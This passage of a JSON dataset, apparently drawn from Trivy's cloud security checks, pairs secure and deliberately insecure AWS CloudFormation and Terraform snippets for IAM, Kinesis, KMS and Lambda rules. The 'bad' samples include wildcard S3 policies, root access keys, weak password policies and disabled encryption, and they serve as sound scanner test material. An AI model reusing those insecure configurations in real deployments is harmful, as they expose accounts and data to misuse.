              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nResources:\n  BadPolicy:\n    Type: AWS::IAM::Policy\n    Properties:\n      PolicyName: bad_policy\n      PolicyDocument:\n        Version: \"2012-10-17\"\n        Statement:\n          - Effect: Allow\n            Action: s3:*\n            Resource: '*'\n      Roles:\n        - !Ref BadRole\n\n  BadRole:\n    Type: AWS::IAM::Role\n    Properties:\n      RoleName: bad_role\n      AssumeRolePolicyDocument:\n        Version: \"2012-10-17\"\n        Statement:\n          - Effect: Allow\n            Principal:\n              Service: ec2.amazonaws.com\n            Action: sts:AssumeRole"
            ]
          },
          "terraform": {
            "good": [
              "resource \"aws_iam_policy\" \"good_policy\" {\n  name = \"good_policy\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect = \"Allow\"\n        Action = [\n          \"s3:GetObject\",\n          \"s3:PutObject\"\n        ]\n        Resource = \"arn:aws:s3:::examplebucket/*\"\n      }\n    ]\n  })\n}\n\nresource \"aws_iam_role\" \"good_role\" {\n  name = \"good_role\"\n  assume_role_policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect = \"Allow\"\n        Principal = {\n          Service = \"ec2.amazonaws.com\"\n        }\n        Action = \"sts:AssumeRole\"\n      }\n    ]\n  })\n}\n\nresource \"aws_iam_role_policy_attachment\" \"good_role_policy_attachment\" {\n  role       = aws_iam_role.good_role.name\n  policy_arn = aws_iam_policy.good_policy.arn\n}"
            ],
            "bad": [
              "resource \"aws_iam_policy\" \"bad_policy\" {\n  name = \"bad_policy\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect   = \"Allow\"\n        Action   = \"s3:*\"\n        Resource = \"*\"\n      }\n    ]\n  })\n}\n\nresource \"aws_iam_role_policy_attachment\" \"test\" {\n  role       = aws_iam_role.test.name\n  policy_arn = \"arn:aws:iam::aws:policy/AmazonS3FullAccess\"\n}\n\nresource \"aws_iam_role\" \"bad_role\" {\n  name = \"bad_role\"\n  assume_role_policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect = \"Allow\"\n        Principal = {\n          Service = \"ec2.amazonaws.com\"\n        }\n        Action = \"sts:AssumeRole\"\n      }\n    ]\n  })\n}\n\nresource \"aws_iam_role_policy_attachment\" \"bad_role_policy_attachment\" {\n  role       = aws_iam_role.bad_role.name\n  policy_arn = aws_iam_policy.bad_policy.arn\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-IAM-NO_PASSWORD_REUSE",
        "title": "No Password Reuse",
        "provider": "aws",
        "service": "iam",
        "language": "cloudformation",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy\n  good:\n    - |-\n      resource \"aws_iam_account_password_policy\" \"good_example\" {\n        # ...\n        password_reuse_prevention = 5\n        # ...\n      }\n  bad:\n    - |-\n      resource \"aws_iam_account_password_policy\" \"bad_example\" {\n        # ...\n        password_reuse_prevention = 1\n        # ...\n      }\n",
        "file_name": "no_password_reuse.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/iam/no_password_reuse.yaml",
        "local_path": "aws/iam/no_password_reuse.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy"
            ],
            "good": [
              "resource \"aws_iam_account_password_policy\" \"good_example\" {\n  # ...\n  password_reuse_prevention = 5\n  # ...\n}"
            ],
            "bad": [
              "resource \"aws_iam_account_password_policy\" \"bad_example\" {\n  # ...\n  password_reuse_prevention = 1\n  # ...\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-IAM-NO_POLICY_WILDCARDS",
        "title": "No Policy Wildcards",
        "provider": "aws",
        "service": "iam",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodPolicy:\n          Type: AWS::IAM::Policy\n          Properties:\n            PolicyName: CFNUsers\n            PolicyDocument:\n              Version: \"2012-10-17\"\n              Statement:\n                - Effect: Allow\n                  Action:\n                    - s3:ListBuckets\n                  Resource: specific-bucket\n  bad:\n    - |-\n      Resources:\n        BadPolicy:\n          Type: AWS::IAM::Policy\n          Properties:\n            PolicyName: CFNUsers\n            PolicyDocument:\n\n        Version: \"2012-10-17\"\n\n        Statement:\n          - Effect: Allow\n            Action:\n              - cloudformation:Describe*\n              - cloudformation:List*\n              - cloudformation:Get*\n            Resource: '*'\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/data-sources/iam_policy_document\n  good:\n    - |-\n      resource \"aws_iam_role_policy\" \"test_policy\" {\n        name = \"test_policy\"\n        role = aws_iam_role.test_role.id\n\n        policy = data.aws_iam_policy_document.s3_policy.json\n      }\n\n      resource \"aws_iam_role\" \"test_role\" {\n        name = \"test_role\"\n        assume_role_policy = jsonencode({\n          Version = \"2012-10-17\"\n          Statement = [\n            {\n              Action = \"sts:AssumeRole\"\n              Effect = \"Allow\"\n              Sid    = \"\"\n              Principal = {\n                Service = \"s3.amazonaws.com\"\n              }\n            },\n          ]\n        })\n      }\n\n      data \"aws_iam_policy_document\" \"s3_policy\" {\n        statement {\n          principals {\n            type        = \"AWS\"\n            identifiers = [\"arn:aws:iam::${data.aws_caller_identity.current.account_id}:root\"]\n          }\n          actions   = [\"s3:GetObject\"]\n          resources = [aws_s3_bucket.example.arn]\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_iam_role_policy\" \"test_policy\" {\n        name = \"test_policy\"\n        role = aws_iam_role.test_role.id\n\n        policy = data.aws_iam_policy_document.s3_policy.json\n      }\n\n      resource \"aws_iam_role\" \"test_role\" {\n        name = \"test_role\"\n        assume_role_policy = jsonencode({\n          Version = \"2012-10-17\"\n          Statement = [\n            {\n              Action = \"sts:AssumeRole\"\n              Effect = \"Allow\"\n              Sid    = \"\"\n              Principal = {\n                Service = \"s3.amazonaws.com\"\n              }\n            },\n          ]\n        })\n      }\n\n      data \"aws_iam_policy_document\" \"s3_policy\" {\n        statement {\n          principals {\n            type        = \"AWS\"\n            identifiers = [\"arn:aws:iam::${data.aws_caller_identity.current.account_id}:root\"]\n          }\n          actions   = [\"s3:*\"]\n          resources = [\"*\"]\n        }\n      }\n",
        "file_name": "no_policy_wildcards.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/iam/no_policy_wildcards.yaml",
        "local_path": "aws/iam/no_policy_wildcards.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodPolicy:\n    Type: AWS::IAM::Policy\n    Properties:\n      PolicyName: CFNUsers\n      PolicyDocument:\n        Version: \"2012-10-17\"\n        Statement:\n          - Effect: Allow\n            Action:\n              - s3:ListBuckets\n            Resource: specific-bucket"
            ],
            "bad": [
              "Resources:\n  BadPolicy:\n    Type: AWS::IAM::Policy\n    Properties:\n      PolicyName: CFNUsers\n      PolicyDocument:\n\n  Version: \"2012-10-17\"\n\n  Statement:\n    - Effect: Allow\n      Action:\n        - cloudformation:Describe*\n        - cloudformation:List*\n        - cloudformation:Get*\n      Resource: '*'"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/data-sources/iam_policy_document"
            ],
            "good": [
              "resource \"aws_iam_role_policy\" \"test_policy\" {\n  name = \"test_policy\"\n  role = aws_iam_role.test_role.id\n\n  policy = data.aws_iam_policy_document.s3_policy.json\n}\n\nresource \"aws_iam_role\" \"test_role\" {\n  name = \"test_role\"\n  assume_role_policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Action = \"sts:AssumeRole\"\n        Effect = \"Allow\"\n        Sid    = \"\"\n        Principal = {\n          Service = \"s3.amazonaws.com\"\n        }\n      },\n    ]\n  })\n}\n\ndata \"aws_iam_policy_document\" \"s3_policy\" {\n  statement {\n    principals {\n      type        = \"AWS\"\n      identifiers = [\"arn:aws:iam::${data.aws_caller_identity.current.account_id}:root\"]\n    }\n    actions   = [\"s3:GetObject\"]\n    resources = [aws_s3_bucket.example.arn]\n  }\n}"
            ],
            "bad": [
              "resource \"aws_iam_role_policy\" \"test_policy\" {\n  name = \"test_policy\"\n  role = aws_iam_role.test_role.id\n\n  policy = data.aws_iam_policy_document.s3_policy.json\n}\n\nresource \"aws_iam_role\" \"test_role\" {\n  name = \"test_role\"\n  assume_role_policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Action = \"sts:AssumeRole\"\n        Effect = \"Allow\"\n        Sid    = \"\"\n        Principal = {\n          Service = \"s3.amazonaws.com\"\n        }\n      },\n    ]\n  })\n}\n\ndata \"aws_iam_policy_document\" \"s3_policy\" {\n  statement {\n    principals {\n      type        = \"AWS\"\n      identifiers = [\"arn:aws:iam::${data.aws_caller_identity.current.account_id}:root\"]\n    }\n    actions   = [\"s3:*\"]\n    resources = [\"*\"]\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-IAM-NO_ROOT_ACCESS_KEYS",
        "title": "No Root Access Keys",
        "provider": "aws",
        "service": "iam",
        "language": "cloudformation",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_access_key\n  good:\n    - |-\n      resource \"aws_iam_user\" \"test\" {\n        name = \"lowprivuser\"\n      }\n\n      resource \"aws_iam_access_key\" \"test\" {\n        user = aws_iam_user.test.name\n      }\n  bad:\n    - |-\n      resource \"aws_iam_user\" \"test\" {\n        name = \"root\"\n      }\n\n      resource \"aws_iam_access_key\" \"test\" {\n        user = aws_iam_user.test.name\n      }\n",
        "file_name": "no_root_access_keys.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/iam/no_root_access_keys.yaml",
        "local_path": "aws/iam/no_root_access_keys.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_access_key"
            ],
            "good": [
              "resource \"aws_iam_user\" \"test\" {\n  name = \"lowprivuser\"\n}\n\nresource \"aws_iam_access_key\" \"test\" {\n  user = aws_iam_user.test.name\n}"
            ],
            "bad": [
              "resource \"aws_iam_user\" \"test\" {\n  name = \"root\"\n}\n\nresource \"aws_iam_access_key\" \"test\" {\n  user = aws_iam_user.test.name\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-IAM-NO_USER_ATTACHED_POLICIES",
        "title": "No User Attached Policies",
        "provider": "aws",
        "service": "iam",
        "language": "cloudformation",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_user\n  good:\n    - |-\n      resource \"aws_iam_group\" \"developers\" {\n        name = \"developers\"\n        path = \"/users/\"\n      }\n\n      resource \"aws_iam_user\" \"jim\" {\n        name = \"jim\"\n      }\n\n      resource \"aws_iam_group_membership\" \"devteam\" {\n        name = \"developers-team\"\n\n        users = [\n          aws_iam_user.jim.name,\n        ]\n\n        group = aws_iam_group.developers.name\n      }\n\n      resource \"aws_iam_group_policy\" \"ec2policy\" {\n        name  = \"test\"\n        group = aws_iam_group.developers.name\n\n        policy = <<EOF\n      {\n        \"Version\": \"2012-10-17\",\n        \"Statement\": [\n          {\n            \"Action\": [\n              \"ec2:Describe*\"\n            ],\n            \"Effect\": \"Allow\",\n            \"Resource\": \"*\"\n          }\n        ]\n      }\n      EOF\n      }\n  bad:\n    - |-\n      resource \"aws_iam_user\" \"jim\" {\n        name = \"jim\"\n      }\n\n      resource \"aws_iam_user_policy\" \"ec2policy\" {\n        name = \"test\"\n        user = aws_iam_user.jim.name\n\n        policy = <<EOF\n      {\n        \"Version\": \"2012-10-17\",\n        \"Statement\": [\n          {\n            \"Action\": [\n              \"ec2:Describe*\"\n            ],\n            \"Effect\": \"Allow\",\n            \"Resource\": \"*\"\n          }\n        ]\n      }\n      EOF\n      }\n",
        "file_name": "no_user_attached_policies.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/iam/no_user_attached_policies.yaml",
        "local_path": "aws/iam/no_user_attached_policies.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_user"
            ],
            "good": [
              "resource \"aws_iam_group\" \"developers\" {\n  name = \"developers\"\n  path = \"/users/\"\n}\n\nresource \"aws_iam_user\" \"jim\" {\n  name = \"jim\"\n}\n\nresource \"aws_iam_group_membership\" \"devteam\" {\n  name = \"developers-team\"\n\n  users = [\n    aws_iam_user.jim.name,\n  ]\n\n  group = aws_iam_group.developers.name\n}\n\nresource \"aws_iam_group_policy\" \"ec2policy\" {\n  name  = \"test\"\n  group = aws_iam_group.developers.name\n\n  policy = <<EOF\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Action\": [\n        \"ec2:Describe*\"\n      ],\n      \"Effect\": \"Allow\",\n      \"Resource\": \"*\"\n    }\n  ]\n}\nEOF\n}"
            ],
            "bad": [
              "resource \"aws_iam_user\" \"jim\" {\n  name = \"jim\"\n}\n\nresource \"aws_iam_user_policy\" \"ec2policy\" {\n  name = \"test\"\n  user = aws_iam_user.jim.name\n\n  policy = <<EOF\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Action\": [\n        \"ec2:Describe*\"\n      ],\n      \"Effect\": \"Allow\",\n      \"Resource\": \"*\"\n    }\n  ]\n}\nEOF\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-IAM-REQUIRE_LOWERCASE_IN_PASSWORDS",
        "title": "Require Lowercase In Passwords",
        "provider": "aws",
        "service": "iam",
        "language": "cloudformation",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy\n  good:\n    - |-\n      resource \"aws_iam_account_password_policy\" \"good_example\" {\n        # ...\n        require_lowercase_characters = true\n        # ...\n      }\n  bad:\n    - |-\n      resource \"aws_iam_account_password_policy\" \"bad_example\" {\n        # ...\n        # require_lowercase_characters not set\n        # ...\n      }\n",
        "file_name": "require_lowercase_in_passwords.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/iam/require_lowercase_in_passwords.yaml",
        "local_path": "aws/iam/require_lowercase_in_passwords.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy"
            ],
            "good": [
              "resource \"aws_iam_account_password_policy\" \"good_example\" {\n  # ...\n  require_lowercase_characters = true\n  # ...\n}"
            ],
            "bad": [
              "resource \"aws_iam_account_password_policy\" \"bad_example\" {\n  # ...\n  # require_lowercase_characters not set\n  # ...\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-IAM-REQUIRE_NUMBERS_IN_PASSWORDS",
        "title": "Require Numbers In Passwords",
        "provider": "aws",
        "service": "iam",
        "language": "cloudformation",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy\n  good:\n    - |-\n      resource \"aws_iam_account_password_policy\" \"good_example\" {\n        # ...\n        require_numbers = true\n        # ...\n      }\n  bad:\n    - |-\n      resource \"aws_iam_account_password_policy\" \"bad_example\" {\n        # ...\n        # require_numbers not set\n        # ...\n      }\n",
        "file_name": "require_numbers_in_passwords.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/iam/require_numbers_in_passwords.yaml",
        "local_path": "aws/iam/require_numbers_in_passwords.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy"
            ],
            "good": [
              "resource \"aws_iam_account_password_policy\" \"good_example\" {\n  # ...\n  require_numbers = true\n  # ...\n}"
            ],
            "bad": [
              "resource \"aws_iam_account_password_policy\" \"bad_example\" {\n  # ...\n  # require_numbers not set\n  # ...\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-IAM-REQUIRE_SYMBOLS_IN_PASSWORDS",
        "title": "Require Symbols In Passwords",
        "provider": "aws",
        "service": "iam",
        "language": "cloudformation",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy\n  good:\n    - |-\n      resource \"aws_iam_account_password_policy\" \"good_example\" {\n        # ...\n        require_symbols = true\n        # ...\n      }\n  bad:\n    - |-\n      resource \"aws_iam_account_password_policy\" \"bad_example\" {\n        # ...\n        # require_symbols not set\n        # ...\n      }\n",
        "file_name": "require_symbols_in_passwords.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/iam/require_symbols_in_passwords.yaml",
        "local_path": "aws/iam/require_symbols_in_passwords.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy"
            ],
            "good": [
              "resource \"aws_iam_account_password_policy\" \"good_example\" {\n  # ...\n  require_symbols = true\n  # ...\n}"
            ],
            "bad": [
              "resource \"aws_iam_account_password_policy\" \"bad_example\" {\n  # ...\n  # require_symbols not set\n  # ...\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-IAM-REQUIRE_UPPERCASE_IN_PASSWORDS",
        "title": "Require Uppercase In Passwords",
        "provider": "aws",
        "service": "iam",
        "language": "cloudformation",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy\n  good:\n    - |-\n      resource \"aws_iam_account_password_policy\" \"good_example\" {\n        # ...\n        require_uppercase_characters = true\n        # ...\n      }\n  bad:\n    - |-\n      resource \"aws_iam_account_password_policy\" \"bad_example\" {\n        # ...\n        # require_uppercase_characters not set\n        # ...\n      }\n",
        "file_name": "require_uppercase_in_passwords.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/iam/require_uppercase_in_passwords.yaml",
        "local_path": "aws/iam/require_uppercase_in_passwords.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy"
            ],
            "good": [
              "resource \"aws_iam_account_password_policy\" \"good_example\" {\n  # ...\n  require_uppercase_characters = true\n  # ...\n}"
            ],
            "bad": [
              "resource \"aws_iam_account_password_policy\" \"bad_example\" {\n  # ...\n  # require_uppercase_characters not set\n  # ...\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-IAM-SET_MAX_PASSWORD_AGE",
        "title": "Set Max Password Age",
        "provider": "aws",
        "service": "iam",
        "language": "cloudformation",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy\n  good:\n    - |-\n      resource \"aws_iam_account_password_policy\" \"good_example\" {\n        max_password_age = 90\n      }\n  bad:\n    - |-\n      resource \"aws_iam_account_password_policy\" \"bad_example\" {\n        # ...\n        # max_password_age not set\n        # ...\n      }\n",
        "file_name": "set_max_password_age.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/iam/set_max_password_age.yaml",
        "local_path": "aws/iam/set_max_password_age.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy"
            ],
            "good": [
              "resource \"aws_iam_account_password_policy\" \"good_example\" {\n  max_password_age = 90\n}"
            ],
            "bad": [
              "resource \"aws_iam_account_password_policy\" \"bad_example\" {\n  # ...\n  # max_password_age not set\n  # ...\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-IAM-SET_MINIMUM_PASSWORD_LENGTH",
        "title": "Set Minimum Password Length",
        "provider": "aws",
        "service": "iam",
        "language": "cloudformation",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy\n  good:\n    - |-\n      resource \"aws_iam_account_password_policy\" \"good_example\" {\n        minimum_password_length = 14\n      }\n  bad:\n    - |-\n      resource \"aws_iam_account_password_policy\" \"bad_example\" {\n        # ...\n        # minimum_password_length not set\n        # ...\n      }\n",
        "file_name": "set_minimum_password_length.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/iam/set_minimum_password_length.yaml",
        "local_path": "aws/iam/set_minimum_password_length.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy"
            ],
            "good": [
              "resource \"aws_iam_account_password_policy\" \"good_example\" {\n  minimum_password_length = 14\n}"
            ],
            "bad": [
              "resource \"aws_iam_account_password_policy\" \"bad_example\" {\n  # ...\n  # minimum_password_length not set\n  # ...\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-KINESIS-ENABLE_IN_TRANSIT_ENCRYPTION",
        "title": "Enable In Transit Encryption",
        "provider": "aws",
        "service": "kinesis",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Kinesis::Stream\n          Properties:\n            Name: GoodExample\n            RetentionPeriodHours: 168\n            ShardCount: 3\n            StreamEncryption:\n              EncryptionType: KMS\n              KeyId: alias/key\n            Tags:\n              - Key: Environment\n                Value: Production\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Kinesis::Stream\n          Properties:\n            Name: BadExample\n            RetentionPeriodHours: 168\n            ShardCount: 3\n            Tags:\n              - Key: Environment\n                Value: Production\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/kinesis_stream#encryption_type\n  good:\n    - |-\n      resource \"aws_kinesis_stream\" \"good_example\" {\n        encryption_type = \"KMS\"\n        kms_key_id      = \"my/special/key\"\n      }\n  bad:\n    - |-\n      resource \"aws_kinesis_stream\" \"bad_example\" {\n        encryption_type = \"NONE\"\n      }\n",
        "file_name": "enable_in_transit_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/kinesis/enable_in_transit_encryption.yaml",
        "local_path": "aws/kinesis/enable_in_transit_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::Kinesis::Stream\n    Properties:\n      Name: GoodExample\n      RetentionPeriodHours: 168\n      ShardCount: 3\n      StreamEncryption:\n        EncryptionType: KMS\n        KeyId: alias/key\n      Tags:\n        - Key: Environment\n          Value: Production"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::Kinesis::Stream\n    Properties:\n      Name: BadExample\n      RetentionPeriodHours: 168\n      ShardCount: 3\n      Tags:\n        - Key: Environment\n          Value: Production"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/kinesis_stream#encryption_type"
            ],
            "good": [
              "resource \"aws_kinesis_stream\" \"good_example\" {\n  encryption_type = \"KMS\"\n  kms_key_id      = \"my/special/key\"\n}"
            ],
            "bad": [
              "resource \"aws_kinesis_stream\" \"bad_example\" {\n  encryption_type = \"NONE\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-KMS-AUTO_ROTATE_KEYS",
        "title": "Auto Rotate Keys",
        "provider": "aws",
        "service": "kms",
        "language": "cloudformation",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/kms_key#enable_key_rotation\n  good:\n    - |-\n      resource \"aws_kms_key\" \"good_example\" {\n        enable_key_rotation = true\n      }\n    - |-\n      resource \"aws_kms_key\" \"good_example\" {\n        enable_key_rotation = false\n        key_usage           = \"SIGN_VERIFY\"\n      }\n  bad:\n    - |-\n      resource \"aws_kms_key\" \"bad_example\" {\n        enable_key_rotation = false\n      }\n",
        "file_name": "auto_rotate_keys.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/kms/auto_rotate_keys.yaml",
        "local_path": "aws/kms/auto_rotate_keys.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/kms_key#enable_key_rotation"
            ],
            "good": [
              "resource \"aws_kms_key\" \"good_example\" {\n  enable_key_rotation = true\n}",
              "resource \"aws_kms_key\" \"good_example\" {\n  enable_key_rotation = false\n  key_usage           = \"SIGN_VERIFY\"\n}"
            ],
            "bad": [
              "resource \"aws_kms_key\" \"bad_example\" {\n  enable_key_rotation = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-LAMBDA-ENABLE_TRACING",
        "title": "Enable Tracing",
        "provider": "aws",
        "service": "lambda",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Lambda::Function\n          Properties:\n            Code:\n              S3Bucket: my-bucket\n              S3Key: function.zip\n            Handler: index.handler\n            Runtime: nodejs12.x\n            TracingConfig:\n              Mode: Active\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Lambda::Function\n          Properties:\n            Code:\n              S3Bucket: my-bucket\n              S3Key: function.zip\n            Handler: index.handler\n            Runtime: nodejs12.x\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lambda_function#mode\n  good:\n    - |-\n      resource \"aws_lambda_function\" \"good_example\" {\n        filename         = \"lambda_function_payload.zip\"\n        function_name    = \"lambda_function_name\"\n        role             = \"arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole\"\n        handler          = \"exports.test\"\n        source_code_hash = filebase64sha256(\"lambda_function_payload.zip\")\n\n        runtime = \"nodejs12.x\"\n        tracing_config {\n          mode = \"Active\"\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_lambda_function\" \"bad_example\" {\n        filename         = \"lambda_function_payload.zip\"\n        function_name    = \"lambda_function_name\"\n        role             = \"arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole\"\n        handler          = \"exports.test\"\n        source_code_hash = filebase64sha256(\"lambda_function_payload.zip\")\n\n        runtime = \"nodejs12.x\"\n\n        tracing_config {\n          mode = \"Passthrough\"\n        }\n      }\n",
        "file_name": "enable_tracing.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/lambda/enable_tracing.yaml",
        "local_path": "aws/lambda/enable_tracing.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::Lambda::Function\n    Properties:\n      Code:\n        S3Bucket: my-bucket\n        S3Key: function.zip\n      Handler: index.handler\n      Runtime: nodejs12.x\n      TracingConfig:\n        Mode: Active"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::Lambda::Function\n    Properties:\n      Code:\n        S3Bucket: my-bucket\n        S3Key: function.zip\n      Handler: index.handler\n      Runtime: nodejs12.x"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lambda_function#mode"
            ],
            "good": [
              "resource \"aws_lambda_function\" \"good_example\" {\n  filename         = \"lambda_function_payload.zip\"\n  function_name    = \"lambda_function_name\"\n  role             = \"arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole\"\n  handler          = \"exports.test\"\n  source_code_hash = filebase64sha256(\"lambda_function_payload.zip\")\n\n  runtime = \"nodejs12.x\"\n  tracing_config {\n    mode = \"Active\"\n  }\n}"
            ],
            "bad": [
              "resource \"aws_lambda_function\" \"bad_example\" {\n  filename         = \"lambda_function_payload.zip\"\n  function_name    = \"lambda_function_name\"\n  role             = \"arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole\"\n  handler          = \"exports.test\"\n  source_code_hash = filebase64sha256(\"lambda_function_payload.zip\")\n\n  runtime = \"nodejs12.x\"\n\n  tracing_config {\n    mode = \"Passthrough\"\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-LAMBDA-RESTRICT_SOURCE_ARN",
        "title": "Restrict Source Arn",
        "provider": "aws",
        "service": "lambda",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Lambda::Function\n          Properties:\n            Code:\n              S3Bucket: my-bucket\n              S3Key: function.zip\n            Handler: index.handler\n            Role: arn:aws:iam::123456789012:role/lambda-role\n            Runtime: nodejs12.x\n            Timeout: 5\n            TracingConfig:\n              Mode: Active\n            VpcConfig:\n              SecurityGroupIds:\n                - sg-085912345678492fb\n              SubnetIds:\n                - subnet-071f712345678e7c8\n                - subnet-07fd123456788a036\n\n        GoodPermission:\n          Type: AWS::Lambda::Permission\n          Properties:\n            Action: lambda:InvokeFunction\n            FunctionName: !Ref GoodExample\n            Principal: s3.amazonaws.com\n            SourceArn: lambda.amazonaws.com\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Lambda::Function\n          Properties:\n            Code:\n              S3Bucket: my-bucket\n              S3Key: function.zip\n            Handler: index.handler\n            Role: arn:aws:iam::123456789012:role/lambda-role\n            Runtime: nodejs12.x\n            Timeout: 5\n            TracingConfig:\n              Mode: Active\n            VpcConfig:\n              SecurityGroupIds:\n                - sg-085912345678492fb\n              SubnetIds:\n                - 